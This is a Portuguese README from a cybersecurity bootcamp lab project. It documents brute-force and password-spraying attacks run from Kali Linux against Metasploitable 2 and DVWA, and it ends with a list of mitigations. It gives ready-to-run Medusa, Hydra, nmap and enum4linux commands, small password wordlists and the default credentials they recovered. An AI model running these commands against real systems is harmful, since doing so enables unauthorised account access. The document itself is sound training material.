# Projeto 2 - Simulando um Ataque de Brute Force com Kali Linux
![DIO](https://img.shields.io/badge/DIO-Bootcamp-blue)
![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Study-blue)
![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Pentest-black)
![Status](https://img.shields.io/badge/Status-Concluído-success)

Segundo projeto do Bootcamp de Cibersegurança da DIO em parceria com a Riachuelo.

---

## Sobre o Projeto

Este projeto demonstra, na prática, como ataques de **força bruta** são utilizados para explorar credenciais fracas em ambientes vulneráveis.

Foi criado um laboratório controlado utilizando:

- Kali Linux (máquina atacante)  
- Metasploitable 2 (máquina vulnerável)  

Durante o projeto foram simulados ataques em diferentes serviços para compreender o comportamento real de invasores e os riscos associados ao uso de senhas fracas.

Foram aplicadas práticas de:

- enumeração de serviços  
- criação de wordlists  
- brute force em múltiplos protocolos  
- validação de acesso  
- análise de vulnerabilidades  

---

# Objetivo

Simular ataques de força bruta em ambiente controlado para entender:

- como credenciais fracas são exploradas  
- diferenças entre brute force e password spraying  
- impacto de configurações inseguras  
- técnicas básicas utilizadas em pentests  

---

# Estrutura do Repositório

```
ciberseguranca_brute_force/
├── images/          #Diretório com as imagens dos resultados das simulações
├── wordlists/
│ ├── pass.txt       #Arquivo com usuários para ataques FTP e HTTP
│ ├── smb_users.txt  #Arquivo com usuários para ataque SMB
│ ├── spray_pass.txt #Arquivo com senhas para ataque SMB
│ └── users.txt      #Arquivo com usuários para ataques FTP e HTTP
├── README.md        #Este arquivo
├── enum4_output.txt #Arquivo exportado com o resultado da Enumeração executada
└── premissas_desafio.md        #Arquivo com as premissas do desafio
```

---

# Ambiente de Testes

- Kali Linux (atacante)  
- Metasploitable 2 (alvo vulnerável)  
- VirtualBox (rede Host-Only)  

---

# Etapas do Projeto

## 1. Descoberta de Serviços

Utilizando Nmap para identificar serviços ativos:

```bash 
nmap -sV 192.168.56.103
```

Serviços encontrados:

- FTP (21)  
- SSH (22)  
- SMB (139/445)  
- HTTP (80)
- 
![FTP Serviço](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/ftp_servico.png)

---

## 2. Força Bruta em FTP

Utilizando Medusa para ataque em FTP:

```bash 
medusa -h 192.168.56.103 -U users.txt -P senhas.txt -M ftp -t 2 -f
```

Resultado:

login: msfadmin   
senha: msfadmin

![FTP Brute Force](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/ftp_brute_force.png)

---

## 3. Ataque em Aplicação Web (DVWA)

A aplicação DVWA foi utilizada para simular ataque em formulário de login.

Após análise da requisição HTTP, foi utilizado Hydra:

```bash 
hydra -l admin -P senhas.txt 192.168.56.103 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

Resultado:

usuário: admin   
senha: password

![DVWA Brute Force](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/dvwa_brute_force.png)

---

## 4. Enumeração SMB

Enumeração de usuários com enum4linux:

```bash 
enum4linux 192.168.56.103
```

Usuários encontrados:

- msfadmin    
- user  

![SMB Enumeração](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/smb_enumeracao.png)

---

## 5. Password Spraying em SMB

Ataque com Medusa utilizando técnica de spraying:

```bash 
medusa -h 192.168.56.103 -U smb_users.txt -P spray_pass.txt -M smbnt -t 1
```

Resultado:

usuário: msfadmin   
senha: msfadmin

![SMB Brute Force](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/smb_brute_force.png)

---

## 6. Validação de Acesso

Validação via smbclient:

```bash 
smbclient -L //192.168.56.103 -U msfadmin
```

![SMB Login](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/smb_login_credenciais.png)

---

# Wordlists Utilizadas

## users.txt
user   
admin   
msfadmin   
root   


## smb_users.txt
user   
msfadmin   
service   


## senhas.txt
123456   
password   
qwerty   
msfadmin   


## spray_pass.txt
password   
123456   
Welcome123   
msfadmin   


---

# Conceitos Aplicados

## Brute Force

Ataque baseado em múltiplas tentativas de senha para um usuário específico.

## Password Spraying

Ataque que utiliza poucas senhas comuns testadas contra vários usuários.

---

# Mitigações

Para evitar esse tipo de ataque, recomenda-se:

- uso de senhas fortes  
- implementação de MFA  
- bloqueio após tentativas inválidas  
- monitoramento de autenticação  
- desativação de serviços desnecessários  

---

# Conclusão

O projeto demonstrou que sistemas com configurações fracas e senhas simples podem ser comprometidos com facilidade utilizando ferramentas básicas.

Mesmo sem técnicas avançadas, ataques de força bruta continuam sendo altamente eficazes, principalmente em ambientes mal configurados.

---

# Aprendizados

- importância da enumeração antes do ataque  
- diferença entre brute force e password spraying  
- funcionamento de autenticação em diferentes serviços  
- limitações de ataques em aplicações web modernas  

---

# Glossário

**FTP (File Transfer Protocol)**  
Protocolo de rede utilizado para transferência de arquivos entre cliente e servidor.

**DVWA**  
Aplicação vulnerável usada para treinamento em segurança.

**SMB**  
Protocolo utilizado para compartilhamento de arquivos em redes Windows.

**Brute Force**  
Técnica de tentativa e erro para descobrir credenciais.

**Password Spraying**  
Técnica que testa poucas senhas comuns em vários usuários.

**Wordlist**  
Lista de palavras utilizada em ataques de senha.
